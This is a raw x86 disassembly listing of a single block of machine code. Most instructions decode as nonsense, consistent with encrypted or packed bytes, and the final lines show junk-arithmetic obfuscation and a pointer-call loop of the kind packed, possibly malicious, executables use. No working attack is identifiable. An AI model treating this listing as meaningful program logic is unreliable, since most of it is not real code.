  41cc4a:	and    ah,BYTE PTR ds:0xf8abf694
  41cc50:	sub    BYTE PTR [ebx+ebx*8+0x4c],bl
  41cc54:	mov    dh,0x9f
  41cc56:	pop    ebp
  41cc57:	jp     0x41cc7a
  41cc59:	jle    0x41cc11
  41cc5b:	or     ebx,DWORD PTR [ebx]
  41cc5d:	stc    
  41cc5e:	mov    ds:0x985e9fd8,eax
  41cc63:	jl     0x41ccab
  41cc65:	leave  
  41cc66:	(bad)  
  41cc67:	adc    eax,0x9e052ca2
  41cc6c:	repz imul eax,DWORD PTR [esp+ecx*8+0x429f6a6d],0xffffff8a
  41cc75:	in     eax,0x70
  41cc77:	stos   BYTE PTR es:[edi],al
  41cc78:	jmp    0x41cc10
  41cc7a:	call   0x8800:0x4dff8ea4
  41cc81:	push   eax
  41cc82:	push   ds
  41cc83:	mov    ds,WORD PTR [ebx+edi*1]
  41cc86:	fiadd  DWORD PTR gs:[edi+ebx*4]
  41cc8a:	mov    ecx,0x5de40381
  41cc8f:	(bad)  
  41cc90:	outs   dx,BYTE PTR ds:[esi]
  41cc91:	aam    0x15
  41cc93:	div    DWORD PTR [eax-0x35e3efbb]
  41cc99:	rcr    edi,cl
  41cc9b:	call   0x2ad3c895
  41cca0:	jo     0x41cc6e
  41cca2:	cmc    
  41cca3:	adc    DWORD PTR [ebx],ebx
  41cca5:	imul   eax,DWORD PTR [ebp+0xdaeafca],0x86b9901b
  41ccaf:	neg    DWORD PTR ds:0xb22eda38
  41ccb5:	cmp    ah,ah
  41ccb7:	sub    BYTE PTR [ebx],cl
  41ccb9:	fadd   DWORD PTR [eax+0x3d]
  41ccbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ccbd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ccbe:	mov    dl,0xe6
  41ccc0:	cdq    
  41ccc1:	std    
  41ccc2:	inc    edi
  41ccc3:	gs push ds
  41ccc5:	std    
  41ccc6:	in     eax,dx
  41ccc7:	pop    ecx
  41ccc8:	outs   dx,DWORD PTR ds:[esi]
  41ccc9:	inc    edi
  41ccca:	or     BYTE PTR [ecx-0x14eb088e],ch
  41ccd0:	es js  0x41ccb6
  41ccd3:	outs   dx,DWORD PTR ss:[esi]
  41ccd5:	retf   0x595f
  41ccd8:	gs loop 0x41cc80
  41ccdb:	rcr    DWORD PTR [ebx],cl
  41ccdd:	imul   esp,DWORD PTR [esi],0xffffffa5
  41cce0:	lds    esp,FWORD PTR [eax+0x14]
  41cce3:	dec    ebx
  41cce4:	mov    al,ds:0x9b924e5d
  41cce9:	ret    0xacc8
  41ccec:	pop    esi
  41cced:	cmp    bh,BYTE PTR [edi-0x5d]
  41ccf0:	mov    eax,0x26640c2a
  41ccf5:	ror    BYTE PTR [esi-0x2],0xfb
  41ccf9:	sti    
  41ccfa:	ins    BYTE PTR es:[edi],dx
  41ccfb:	adc    ebp,DWORD PTR ds:0x2cdea6c4
  41cd01:	int    0xd0
  41cd03:	repz repz xor ebp,DWORD PTR es:[ecx]
  41cd08:	and    DWORD PTR [esi+0x5abd7dba],ebp
  41cd0e:	pop    eax
  41cd0f:	cwde   
  41cd10:	push   ebx
  41cd11:	(bad)  
  41cd13:	mov    bh,0x56
  41cd15:	cld    
  41cd16:	sbb    eax,0x64da836d
  41cd1b:	cmp    al,0x73
  41cd1d:	aam    0x43
  41cd1f:	and    ah,BYTE PTR [ebp+0x2ad68ef0]
  41cd25:	xor    BYTE PTR [eax+0x50],0x61
  41cd29:	xor    al,0x38
  41cd2b:	pop    ebx
  41cd2c:	dec    ebp
  41cd2d:	sbb    ah,BYTE PTR [ecx-0xa]
  41cd30:	in     eax,dx
  41cd31:	adc    al,0x5d
  41cd33:	lahf   
  41cd34:	pop    edi
  41cd35:	enter  0xbed4,0x35
  41cd39:	leave  
  41cd3a:	(bad)
  41cd3d:	(bad)  
  41cd3f:	xor    al,0xf3
  41cd41:	jnp    0x41cdaa
  41cd43:	inc    edx
  41cd44:	sub    ch,BYTE PTR [ecx+0x2f]
  41cd47:	add    DWORD PTR [eax+0x4e7f62e8],ecx
  41cd4d:	loope  0x41cce0
  41cd4f:	jbe    0x41cd2f
  41cd51:	lock push 0x2bab102f
  41cd57:	repz fld DWORD PTR [ebx]
  41cd5a:	cmp    eax,0xc4be1330
  41cd5f:	in     al,dx
  41cd60:	jbe    0x41cdd5
  41cd62:	adc    BYTE PTR [esp+edi*1],0xcc
  41cd66:	sub    al,0x69
  41cd68:	mov    al,ds:0x118e664b
  41cd6d:	inc    ebx
  41cd6e:	jmp    0xaf4a5083
  41cd73:	mov    bh,0x81
  41cd75:	cmc    
  41cd76:	outs   dx,DWORD PTR ds:[esi]
  41cd77:	add    dl,cl
  41cd79:	std    
  41cd7a:	jl     0x41cdb4
  41cd7c:	or     al,0xc2
  41cd7e:	js     0x41cdea
  41cd80:	leave  
  41cd81:	jp     0x41cd5f
  41cd83:	mov    eax,0xcd0cfe63
  41cd88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd89:	xor    bh,BYTE PTR [esi]
  41cd8b:	jno    0x41cd2b
  41cd8d:	sub    eax,0x239ec370
  41cd92:	jge    0x41cddc
  41cd94:	push   edi
  41cd95:	jmp    0x41cd6a
  41cd97:	pop    eax
  41cd98:	repz cmp dl,BYTE PTR [ebx+ebp*4]
  41cd9c:	jp     0x41ce13
  41cd9e:	sub    dh,al
  41cda0:	mov    bh,0x37
  41cda2:	pop    DWORD PTR gs:[ebp+0x762c128b]
  41cda9:	addr16 repz and eax,0x7a3ee5ae
  41cdb0:	ror    BYTE PTR [eax-0x3938a098],1
  41cdb6:	ficom  WORD PTR [ecx]
  41cdb8:	arpl   WORD PTR [ecx-0x5e],bx
  41cdbb:	push   edx
  41cdbc:	loop   0x41cdae
  41cdbe:	and    BYTE PTR [ebp+ecx*1-0x4c74af64],0x90
  41cdc6:	xchg   ebp,eax
  41cdc7:	(bad)  
  41cdc8:	sbb    ebp,DWORD PTR [ebp-0x53]
  41cdcb:	dec    ebx
  41cdcc:	jmp    0x62b4:0x147fd849
  41cdd3:	pop    ecx
  41cdd4:	lds    eax,FWORD PTR [ebx+0x29bf7925]
  41cdda:	ins    DWORD PTR es:[edi],dx
  41cddb:	jno    0x41cd6f
  41cddd:	in     al,dx
  41cdde:	imul   eax,DWORD PTR [eax+0x2e97453a],0xcb80428e
  41cde8:	neg    DWORD PTR [eax+0x4e]
  41cdeb:	in     al,dx
  41cdec:	cwde   
  41cded:	sbb    esi,DWORD PTR [edi-0x340cede7]
  41cdf3:	out    dx,al
  41cdf4:	dec    esi
  41cdf5:	sahf   
  41cdf6:	mov    dl,0xdd
  41cdf8:	outs   dx,BYTE PTR ds:[esi]
  41cdf9:	les    eax,FWORD PTR [edx+0x22c15126]
  41cdff:	cmp    al,0xd4
  41ce01:	ss jnp 0x41cdb7
  41ce04:	cs mov dl,dh
  41ce07:	push   0xffffffdc
  41ce09:	and    ebx,DWORD PTR ss:[ebp+0x535d99c4]
  41ce10:	(bad)  
  41ce11:	xchg   edx,eax
  41ce12:	mov    eax,0x9eadba89
  41ce17:	js     0x41cda2
  41ce19:	jl     0x41cda1
  41ce1b:	stos   BYTE PTR es:[di],al
  41ce1d:	loope  0x41ce09
  41ce1f:	loope  0x41ce24
  41ce21:	dec    edx
  41ce22:	int    0x2f
  41ce24:	(bad)  [esi]
  41ce26:	sub    al,0x0
  41ce28:	out    dx,al
  41ce29:	je     0x41cdcc
  41ce2b:	adc    ebp,DWORD PTR [eax-0x18]
  41ce2e:	and    al,0xa
  41ce30:	jl     0x41ceae
  41ce32:	push   es
  41ce33:	loope  0x41cdce
  41ce35:	jno    0x41ce54
  41ce37:	push   ebx
  41ce38:	xchg   edx,eax
  41ce39:	sbb    DWORD PTR [ebp-0x1385ffe6],0xd68cc382
  41ce43:	add    eax,0xff33e31c
  41ce48:	inc    edx
  41ce49:	data16 jl 0x41ce54
  41ce4c:	bts    DWORD PTR [ebx-0x63],esp
  41ce50:	adc    eax,0x79d9fe3d
  41ce55:	shl    edi,1
  41ce57:	neg    BYTE PTR [esi-0x35]
  41ce5a:	inc    esi
  41ce5b:	das    
  41ce5c:	sar    BYTE PTR [ebx+ecx*8],cl
  41ce5f:	gs ins DWORD PTR es:[edi],dx
  41ce61:	dec    esp
  41ce62:	adc    BYTE PTR ds:0xf9c1c806,dh
  41ce68:	mov    eax,0x5af77ef
  41ce6d:	mov    edx,0xb18c86a4
  41ce72:	ret    
  41ce73:	or     ecx,DWORD PTR ds:0x5e7616dd
  41ce79:	enter  0x23b2,0x55
  41ce7d:	(bad)
  41ce80:	lock loopne 0x41cea0
  41ce83:	push   ebx
  41ce84:	rcl    DWORD PTR [ebx+0x4d],1
  41ce87:	jp     0x41ce3c
  41ce89:	rep outs dx,DWORD PTR ds:[esi]
  41ce8b:	xchg   ebx,eax
  41ce8c:	out    0x19,al
  41ce8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ce8f:	dec    ebp
  41ce90:	stos   DWORD PTR es:[edi],eax
  41ce91:	pop    esp
  41ce92:	mov    DWORD PTR [edi-0x57],edi
  41ce95:	jmp    0x8d83:0x25294f59
  41ce9c:	cdq    
  41ce9d:	mov    cs,WORD PTR [ecx-0x2f5095b7]
  41cea3:	adc    BYTE PTR [edx-0xc],ch
  41cea6:	xchg   bl,bl
  41cea8:	add    eax,0xbc21f49d
  41cead:	or     BYTE PTR [eax-0xd],bh
  41ceb0:	mov    bl,0x77
  41ceb2:	pop    edx
  41ceb3:	jns    0x41cedf
  41ceb5:	ficom  DWORD PTR [eax+0x2ab278f5]
  41cebb:	into   
  41cebc:	sbb    eax,0xdb476dab
  41cec1:	leave  
  41cec2:	jg     0x41cf15
  41cec4:	arpl   WORD PTR es:[edi+0x7daf8630],sp
  41cecb:	inc    ecx
  41cecc:	add    ch,cl
  41cece:	xor    eax,edi
  41ced0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ced1:	or     al,0x96
  41ced4:	pop    ss
  41ced5:	clc    
  41ced6:	pop    ds
  41ced7:	in     eax,dx
  41ced8:	mov    ds:0x4ccdf9aa,al
  41cedd:	mov    ah,0xcb
  41cedf:	xor    al,0x47
  41cee1:	(bad)  
  41cee2:	in     al,0xfc
  41cee4:	mov    dl,0x3b
  41cee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cee7:	pop    ebx
  41cee8:	fs sub al,0x44
  41ceeb:	xchg   esi,eax
  41ceec:	test   DWORD PTR [ecx+0x534df06b],0xb83601a1
  41cef6:	stc    
  41cef7:	or     eax,edi
  41cef9:	fisub  WORD PTR [esi+0x27]
  41cefc:	ins    DWORD PTR es:[edi],dx
  41cefd:	sub    WORD PTR [eax],ax
  41cf00:	ret    
  41cf01:	mov    cl,0x8c
  41cf03:	or     BYTE PTR [edi+0x6ed20e1c],al
  41cf09:	and    DWORD PTR [eax-0x7de71012],ebp
  41cf0f:	dec    ebx
  41cf10:	or     DWORD PTR [eax+0x18],ecx
  41cf13:	mov    cl,0x62
  41cf15:	into   
  41cf16:	sar    DWORD PTR [edi+ebp*1-0x6641f8dd],cl
  41cf1d:	pop    ss
  41cf1e:	pop    es
  41cf1f:	pop    ecx
  41cf20:	dec    ebp
  41cf21:	add    DWORD PTR [ebx],ebx
  41cf23:	jmp    DWORD PTR [edi+0x6652fb8d]
  41cf29:	mov    ebx,0x17b9c897
  41cf2e:	dec    edi
  41cf2f:	jne    0x41cf7a
  41cf31:	pusha  
  41cf32:	mov    BYTE PTR [edi-0x3de9cecb],bh
  41cf38:	data16 fwait
  41cf3a:	in     eax,0xec
  41cf3c:	sbb    ch,cl
  41cf3e:	ss cmc 
  41cf40:	mov    ebp,0x1ebfe06
  41cf45:	addr16 cs jae 0x41cecc
  41cf49:	jp     0x41cf70
  41cf4b:	xor    al,0x22
  41cf4d:	rcl    DWORD PTR [edi],cl
  41cf4f:	jecxz  0x41cfcf
  41cf51:	push   esi
  41cf52:	js     0x41cf3a
  41cf54:	ror    DWORD PTR [ecx],cl
  41cf56:	mul    BYTE PTR [ecx]
  41cf58:	dec    eax
  41cf59:	repz inc ebx
  41cf5b:	mov    edi,0xd6cd17e
  41cf60:	neg    BYTE PTR [eax-0x5c]
  41cf63:	add    DWORD PTR [ebx-0x3a4c6566],ebp
  41cf69:	mov    esi,0x1c570567
  41cf6e:	sub    DWORD PTR [edi+0x22],0xffffffe0
  41cf72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cf73:	pop    esp
  41cf74:	add    ecx,DWORD PTR [ecx+0x38]
  41cf77:	adc    ah,0xaf
  41cf7a:	mov    ch,0xc
  41cf7c:	(bad)  
  41cf7d:	jne    0x41cff7
  41cf7f:	out    dx,eax
  41cf80:	pushf  
  41cf81:	and    al,0xbf
  41cf83:	pop    ecx
  41cf84:	mov    al,ds:0xd51b8b9b
  41cf89:	mov    ?,WORD PTR ds:0x6d383d53
  41cf8f:	mov    al,0x8e
  41cf91:	call   0xa7a7142f
  41cf96:	ins    DWORD PTR es:[edi],dx
  41cf97:	sbb    eax,0x5f7ab86b
  41cf9c:	dec    ebx
  41cf9d:	add    DWORD PTR [ebx-0x19],esi
  41cfa0:	add    dl,BYTE PTR [eax+ebp*4]
  41cfa3:	daa    
  41cfa4:	push   0x78
  41cfa6:	(bad)  
  41cfa7:	std    
  41cfa8:	pop    ebx
  41cfa9:	jnp    0x41cf3b
  41cfab:	jo     0x41cf78
  41cfad:	ret    
  41cfae:	jg     0x41d01e
  41cfb0:	xchg   edx,eax
  41cfb1:	adc    al,0x41
  41cfb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfb4:	je     0x41cfe7
  41cfb6:	mov    ebp,DWORD PTR [ebx]
  41cfb8:	clc    
  41cfb9:	stos   BYTE PTR es:[edi],al
  41cfba:	dec    edx
  41cfbb:	and    al,0xce
  41cfbd:	dec    esp
  41cfbe:	xchg   esi,eax
  41cfbf:	test   al,0x11
  41cfc1:	daa    
  41cfc2:	shl    DWORD PTR [edi-0x4b],cl
  41cfc5:	add    al,0x7b
  41cfc7:	cmp    eax,0x3bbfc876
  41cfcc:	das    
  41cfcd:	out    dx,eax
  41cfce:	push   edi
  41cfcf:	ds aam 0x9c
  41cfd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfd3:	call   0xbdb2:0xe732f92e
  41cfda:	push   ecx
  41cfdb:	adc    DWORD PTR [ebx+0x6b],ebp
  41cfde:	pop    DWORD PTR [edi-0x474c9aba]
  41cfe4:	data16 lods al,BYTE PTR ds:[esi]
  41cfe6:	in     eax,0x9a
  41cfe8:	sti    
  41cfe9:	push   ecx
  41cfea:	dec    edx
  41cfeb:	pop    esp
  41cfec:	scas   eax,DWORD PTR es:[edi]
  41cfed:	stos   BYTE PTR es:[edi],al
  41cfee:	arpl   WORD PTR [edx+0x43],cx
  41cff1:	cmp    eax,0xfc14c4d7
  41cff6:	lock mov ds:0x266d966a,eax
  41cffc:	ds dec ebp
  41cffe:	push   ebx
  41cfff:	mov    WORD PTR [eax+0x17],ds
  41d002:	ror    BYTE PTR es:[esi+0x32],cl
  41d006:	out    0xd6,eax
  41d008:	imul   edi,eax,0xc11f77b4
  41d00e:	push   0x13571599
  41d013:	ud0    ebp,DWORD PTR [ebx+ebx*4]
  41d017:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d018:	sbb    eax,0x5e5fa3df
  41d01d:	jmp    0x31608be6
  41d022:	in     al,dx
  41d023:	adc    DWORD PTR [eax+0x48],esp
  41d026:	es out 0x28,eax
  41d029:	pop    es
  41d02a:	fidiv  WORD PTR [eax-0x6f072c3a]
  41d030:	aam    0xe
  41d032:	ja     0x41d07a
  41d034:	cmp    eax,0xa54d9476
  41d039:	(bad)  fs:[ecx+0xc]
  41d03d:	fimul  DWORD PTR [edx+0x3305684a]
  41d043:	in     eax,dx
  41d044:	mov    edi,0x6505648f
  41d049:	xchg   edx,eax
  41d04a:	cmc    
  41d04b:	repz ret 0x75d2
  41d04f:	and    BYTE PTR [edx-0xcc5fe58],dl
  41d055:	mov    ecx,0xf3e859a0
  41d05a:	sub    ah,BYTE PTR [edx+0x72]
  41d05d:	mov    dl,0xb0
  41d05f:	(bad)  
  41d060:	mov    esi,0x17e3de16
  41d065:	sbb    eax,0xb4cedc41
  41d06a:	or     DWORD PTR [esi],ebx
  41d06c:	das    
  41d06d:	sbb    al,0xdc
  41d06f:	jp     0x41d08b
  41d071:	or     cl,0xc5
  41d074:	jmp    0x44c6:0x8c427d6b
  41d07b:	push   0xa8ff9b64
  41d080:	(bad)  
  41d081:	adc    BYTE PTR [edx-0x3706655b],bl
  41d087:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d088:	sub    bl,BYTE PTR [esp+eiz*2-0x1565474c]
  41d08f:	adc    BYTE PTR [edx+0x63fb353c],0xc5
  41d096:	pusha  
  41d097:	outs   dx,BYTE PTR ds:[esi]
  41d098:	sahf   
  41d099:	jnp    0x41d068
  41d09b:	jle    0x41d10f
  41d09d:	jbe    0x41d117
  41d09f:	sub    ebx,edi
  41d0a1:	push   ebp
  41d0a2:	mov    esi,0xc365fcb2
  41d0a7:	mov    ch,0x2e
  41d0a9:	ins    DWORD PTR es:[edi],dx
  41d0aa:	dec    BYTE PTR [edi]
  41d0ac:	(bad)  
  41d0ad:	cmc    
  41d0ae:	dec    edx
  41d0af:	test   eax,0x49675cd6
  41d0b4:	jne    0x41d08a
  41d0b6:	and    esp,DWORD PTR [ecx-0x23]
  41d0b9:	inc    edi
  41d0ba:	repz xlat BYTE PTR ds:[ebx]
  41d0bc:	mov    edi,0x9c22d8c7
  41d0c1:	pop    esi
  41d0c2:	adc    ah,BYTE PTR [eax+eax*8-0x6fcfd5d8]
  41d0c9:	pop    edi
  41d0ca:	xchg   DWORD PTR [esi+ebx*1-0x6dd164b4],esp
  41d0d1:	pop    ebx
  41d0d2:	or     DWORD PTR [edi-0x5edb57c5],ebp
  41d0d8:	mov    ebx,0xcd1820de
  41d0dd:	jae    0x41d0b6
  41d0df:	rcr    BYTE PTR ds:0x87d6f827,cl
  41d0e5:	or     cl,dh
  41d0e7:	xor    dh,BYTE PTR [edi-0x49]
  41d0ea:	lock pop eax
  41d0ec:	sub    dl,BYTE PTR [esi]
  41d0ee:	and    eax,0x925e8dea
  41d0f3:	call   0xbf039e87
  41d0f8:	adc    DWORD PTR [si+0x1011],ebx
  41d0fd:	fldenv [eax]
  41d0ff:	mov    cl,0xc3
  41d101:	sbb    al,0x8a
  41d103:	jl     0x41d179
  41d105:	call   0x7fe58596
  41d10a:	mov    ds:0xef854a0,eax
  41d10f:	mov    esi,0x481179df
  41d114:	cdq    
  41d115:	and    al,0x71
  41d117:	jns    0x41d16a
  41d119:	in     al,0x23
  41d11b:	repnz mov esi,0x4446d225
  41d121:	add    eax,0xdeb46cfb
  41d126:	xchg   edi,eax
  41d127:	out    dx,eax
  41d128:	int    0xff
  41d12a:	jbe    0x41d119
  41d12c:	sti    
  41d12d:	ds push esp
  41d12f:	popf   
  41d130:	xor    eax,0x45f8e01b
  41d135:	(bad)  
  41d136:	icebp  
  41d137:	xchg   DWORD PTR [edx+edx*4+0x52],ebp
  41d13b:	(bad)
  41d13e:	fnstcw WORD PTR [edi]
  41d140:	cmp    DWORD PTR [ebx+0x7af040b3],0xab0c2caa
  41d14a:	popf   
  41d14b:	pop    ebp
  41d14c:	add    cl,dh
  41d14e:	cmc    
  41d14f:	bound  ebp,QWORD PTR [ebp-0x41dd12f1]
  41d155:	adc    DWORD PTR [esi-0x44b1a7a9],edx
  41d15b:	push   esp
  41d15c:	repz dec edx
  41d15e:	adc    edi,ecx
  41d160:	hlt    
  41d161:	xchg   dh,dl
  41d163:	xor    al,0x3e
  41d165:	pop    ds
  41d166:	cmp    BYTE PTR [ebx+0x3],cl
  41d169:	je     0x41d186
  41d16b:	sahf   
  41d16c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d16d:	inc    edx
  41d16e:	sub    dl,BYTE PTR [edi-0x6c546366]
  41d174:	pop    ebp
  41d175:	add    DWORD PTR [edx+0x22],esp
  41d178:	inc    edx
  41d179:	iret   
  41d17a:	(bad)  
  41d17b:	mov    dh,0x23
  41d17d:	cmc    
  41d17e:	in     al,0xa4
  41d180:	addr16 cdq 
  41d182:	daa    
  41d183:	mov    WORD PTR [esi+ecx*8],gs
  41d186:	in     eax,dx
  41d187:	fisttp DWORD PTR [esi-0x41]
  41d18a:	rol    ecx,0x9f
  41d18d:	(bad)  
  41d18e:	xor    al,0x33
  41d190:	les    edi,FWORD PTR [edx-0x195f63c6]
  41d196:	adc    eax,0xdee6ac6c
  41d19b:	(bad)  
  41d19c:	dec    ecx
  41d19d:	adc    DWORD PTR [ecx+esi*4+0x5fc2a0d1],eax
  41d1a4:	xchg   ebx,eax
  41d1a5:	mov    eax,0x6d4311ae
  41d1aa:	int    0x75
  41d1ac:	jae    0x41d209
  41d1ae:	sbb    dh,BYTE PTR [ebx+0x33]
  41d1b1:	outs   dx,DWORD PTR ds:[esi]
  41d1b2:	jnp    0x41d14c
  41d1b4:	call   0xff18af87
  41d1b9:	push   edi
  41d1ba:	pop    ebx
  41d1bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d1bc:	(bad)  
  41d1bd:	dec    edi
  41d1be:	xor    DWORD PTR ds:0x79281710,0xd532c925
  41d1c8:	fisubr WORD PTR [ecx+ebp*1+0x39]
  41d1cc:	mov    edi,0x30095f7
  41d1d1:	mov    ebx,0x42ddb9d6
  41d1d6:	js     0x41d237
  41d1d8:	adc    BYTE PTR [ebp-0x6],al
  41d1db:	mov    dh,0xc1
  41d1dd:	fadd   DWORD PTR [ecx]
  41d1df:	in     al,0x2d
  41d1e1:	ds jo  0x41d212
  41d1e4:	test   eax,0x752acc8c
  41d1e9:	xor    BYTE PTR [ebp-0x78],cl
  41d1ec:	push   ebp
  41d1ed:	adc    al,dh
  41d1ef:	add    eax,0x8d175256
  41d1f4:	cwde   
  41d1f5:	sub    BYTE PTR [esi+0xf5b3b20],bl
  41d1fb:	jns    0x41d1e8
  41d1fd:	jns    0x41d190
  41d1ff:	sbb    eax,0xa763c569
  41d204:	pusha  
  41d205:	fimul  WORD PTR [ecx-0xf174d98]
  41d20b:	cmp    bl,BYTE PTR [esi+0x26411616]
  41d211:	jns    0x41d1c1
  41d213:	shl    DWORD PTR [edx+eiz*4+0x7d],cl
  41d217:	pop    edi
  41d218:	add    esp,ebp
  41d21a:	fmul   DWORD PTR [edi+0x6e]
  41d21d:	sub    al,BYTE PTR cs:[eax]
  41d220:	jne    0x41d24a
  41d222:	lods   al,BYTE PTR ds:[esi]
  41d223:	push   ebx
  41d224:	aam    0x10
  41d226:	repnz fdiv QWORD PTR [ecx+0x3d]
  41d22a:	ins    BYTE PTR es:[edi],dx
  41d22b:	pop    ds
  41d22c:	or     DWORD PTR [eax+0x4c4ba60d],esp
  41d232:	(bad)  
  41d233:	(bad)  
  41d234:	loop   0x41d29d
  41d236:	pop    esi
  41d237:	mov    ?,WORD PTR [edx]
  41d239:	sub    BYTE PTR [edi-0x16b11d10],0x7e
  41d240:	dec    ecx
  41d241:	test   eax,0x58013a4e
  41d246:	ror    bh,0x79
  41d249:	inc    BYTE PTR [esi-0x31f6b627]
  41d24f:	mov    ebp,0x423881c8
  41d254:	dec    esp
  41d255:	icebp  
  41d256:	out    dx,al
  41d257:	xchg   ebx,eax
  41d258:	imul   edx,DWORD PTR [edi],0xffffffb5
  41d25b:	fwait
  41d25c:	mov    BYTE PTR [edi],bl
  41d25e:	arpl   di,di
  41d260:	mov    esp,0xc760f556
  41d265:	push   ss
  41d266:	scas   al,BYTE PTR es:[edi]
  41d267:	push   ebx
  41d268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d269:	cmp    dl,BYTE PTR [edi]
  41d26b:	push   eax
  41d26c:	js     0x41d257
  41d26e:	test   BYTE PTR [ecx],dh
  41d270:	lods   eax,DWORD PTR ds:[esi]
  41d271:	or     ecx,0x51
  41d274:	cwde   
  41d275:	cmp    BYTE PTR [eax-0x386ba166],ch
  41d27b:	inc    esi
  41d27c:	mov    ds:0xa3c7f0b,al
  41d281:	test   BYTE PTR [esi+edi*1],al
  41d284:	(bad)  
  41d286:	ins    BYTE PTR es:[edi],dx
  41d287:	xor    al,0xe4
  41d289:	imul   edi,ecx,0x29ef2ff5
  41d28f:	sbb    al,0x54
  41d291:	out    0xd4,eax
  41d293:	test   DWORD PTR [eax+0x4b75cdaa],0xba4a309b
  41d29d:	sub    eax,0xf225944f
  41d2a2:	mov    eax,ds:0xaa40b391
  41d2a7:	repnz call 0xbdd3:0xf29ea81d
  41d2af:	jg     0x41d330
  41d2b1:	(bad)  
  41d2b2:	out    dx,al
  41d2b3:	jl     0x41d322
  41d2b5:	add    DWORD PTR [esp+ecx*1-0x8827ed1],esi
  41d2bc:	imul   ebx,ebx,0x1991c38a
  41d2c2:	adc    BYTE PTR ds:0x20a08f5f,0x8
  41d2c9:	xor    ch,ch
  41d2cb:	fnstsw WORD PTR [esi-0x71b6fbd3]
  41d2d1:	fdivr  QWORD PTR [ecx]
  41d2d3:	mov    dh,0xa5
  41d2d5:	cwde   
  41d2d6:	xchg   edi,eax
  41d2d7:	mov    ecx,0x31546e5
  41d2dc:	stc    
  41d2dd:	xor    BYTE PTR [ecx-0xb20b893],cl
  41d2e3:	sub    eax,0xaa9c0650
  41d2e8:	sub    eax,0x25d7cd16
  41d2ed:	and    al,0x83
  41d2ef:	jbe    0x41d2eb
  41d2f1:	gs in  eax,0xf7
  41d2f4:	aad    0x8
  41d2f6:	pop    ss
  41d2f7:	data16 jae 0x41d34d
  41d2fa:	lock and bh,BYTE PTR es:[ebx-0x3d]
  41d2ff:	adc    eax,esi
  41d301:	mov    edi,0xd05880c0
  41d306:	sbb    BYTE PTR [ebp+ebx*2+0x3041166d],dl
  41d30d:	sbb    ebp,0x62
  41d310:	mov    ?,WORD PTR [ebx-0x6ab728f]
  41d316:	inc    esi
  41d317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d318:	daa    
  41d319:	fisub  DWORD PTR es:[ebx+0x75]
  41d31d:	ret    0xb1
  41d320:	push   0xffffffe8
  41d322:	add    eax,0x5cc0ff34
  41d327:	out    dx,eax
  41d328:	xchg   cl,ch
  41d32a:	out    0xe7,eax
  41d32c:	mov    edi,0xef6db3ff
  41d331:	sub    BYTE PTR [esi+0x7d3d6b45],dh
  41d337:	test   eax,0x38e099f9
  41d33c:	hlt    
  41d33d:	and    DWORD PTR ds:0x30970a,edx
  41d343:	dec    eax
  41d344:	out    0xd,eax
  41d346:	int3   
  41d347:	imul   esi,ecx,0xffffff89
  41d34a:	pop    ds
  41d34b:	and    ah,BYTE PTR [eax-0x999b3e0]
  41d351:	cmp    ch,dl
  41d353:	and    al,0xae
  41d355:	test   eax,0xe9dde1f4
  41d35a:	push   ecx
  41d35b:	sbb    al,0xca
  41d35d:	cmp    al,0x30
  41d35f:	sub    esp,DWORD PTR [eax]
  41d361:	jmp    0x41d384
  41d363:	xor    eax,0x788f018b
  41d368:	iret   
  41d369:	addr16 (bad) 
  41d36b:	call   0x8aa77fc4
  41d370:	sbb    ch,BYTE PTR [ebx-0x52bab247]
  41d376:	xchg   ecx,eax
  41d377:	aad    0xb1
  41d379:	mov    ebx,0xd1c3a447
  41d37e:	xlat   BYTE PTR ds:[ebx]
  41d37f:	mov    WORD PTR [eax+0xf],ds
  41d382:	rcr    BYTE PTR [eax-0x6d],1
  41d385:	push   cs
  41d386:	scas   eax,DWORD PTR es:[edi]
  41d387:	pushf  
  41d388:	jo     0x41d38d
  41d38a:	xlat   BYTE PTR ds:[ebx]
  41d38b:	and    edx,ebx
  41d38d:	mov    DWORD PTR [ebp-0x4c],edx
  41d390:	xor    DWORD PTR ds:0x42a2d2,0x7dd7
  41d39a:	mov    edx,DWORD PTR [ebp+0x8]
  41d39d:	mov    ebx,DWORD PTR [ebp-0x48]
  41d3a0:	lea    edx,[ebx+edx*1+0x241fcdf]
  41d3a7:	mov    DWORD PTR [ebp-0x48],edx
  41d3aa:	mov    edx,DWORD PTR [ebp+0x8]
  41d3ad:	mov    ebx,0xfa5e1524
  41d3b2:	sub    ebx,edx
  41d3b4:	mov    DWORD PTR ds:0x42a27a,0x17
  41d3be:	cmp    DWORD PTR ds:0x42a27a,0x0
  41d3c5:	je     0x41d3ff
  41d3cb:	cmp    DWORD PTR ds:0x42a27a,0x25
  41d3d2:	jge    0x41d3ff
  41d3d8:	jmp    0x41d3ed
  41d3dd:	push   0x42a2be
  41d3e2:	push   0x429181
  41d3e7:	call   DWORD PTR ds:0x42a3ca
  41d3ed:	mov    edx,DWORD PTR ds:0x42a27a
  41d3f3:	dec    edx
  41d3f4:	mov    DWORD PTR ds:0x42a27a,edx
  41d3fa:	jmp    0x41d3be
  41d3ff:	add    ebx,DWORD PTR [ebp-0x44]
  41d402:	and    DWORD PTR ds:0x42a25a,ebx
  41d408:	mov    DWORD PTR [ebp-0x44],ebx
  41d40b:	mov    edx,DWORD PTR [ebp+0x8]
  41d40e:	sub    DWORD PTR ds:0x42a25e,0x69af
  41d418:	xor    edx,eax
  41d41a:	adc    DWORD PTR ds:0x42a2e6,0x774b
  41d424:	add    edx,esi
  41d426:	mov    DWORD PTR ds:0x42a2ae,0x6366
  41d430:	jne    0x418abe
  41d436:	jmp    0x421e4f
  41d43b:	adc    DWORD PTR ds:0x42a2d2,edx
  41d441:	mov    edx,DWORD PTR [ebp-0xc]
